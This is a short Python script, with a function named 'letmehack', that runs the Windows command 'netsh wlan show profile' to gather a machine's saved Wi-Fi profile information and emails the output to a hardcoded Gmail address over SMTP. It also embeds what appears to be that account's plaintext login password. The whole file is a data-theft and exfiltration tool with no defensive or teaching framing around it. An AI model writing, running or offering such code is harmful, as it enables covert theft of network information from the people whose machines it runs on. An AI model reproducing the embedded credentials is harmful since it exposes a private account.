import subprocess, smtplib

def send_mail(email,password,message):
	server = smtplib.SMTP('smtp.gmail.com',587)
	server.starttls()
	server.login(email,password)
	server.sendmail(email,email,message)
	server.quit()	



def letmehack():
	command = "netsh wlan show profile"
	result = subprocess.check_output(command,shell=True)
	return result

send_mail("sauravkumar5star@gmail.com","Puja@123",letmehack())